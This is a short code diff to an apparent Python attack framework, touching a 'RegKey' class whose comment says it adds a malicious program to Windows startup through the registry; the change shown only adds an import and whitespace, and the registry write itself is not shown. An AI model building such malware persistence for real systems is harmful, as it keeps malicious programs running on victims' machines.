@@ -1,5 +1,6 @@
 #When making an attack just provide malacious program name and path and it will add it to startups
 
+import os
 import sys
 import ctypes
 import winreg
@@ -7,7 +8,7 @@ import winreg
 from Attack import Attack
 class RegKey(Attack): 
     def execute(self, ProgramName, ProgramPath):
-
+      
         # Add the malacious program to startup
         self.program_name = ProgramName
         self.program_path = ProgramPath
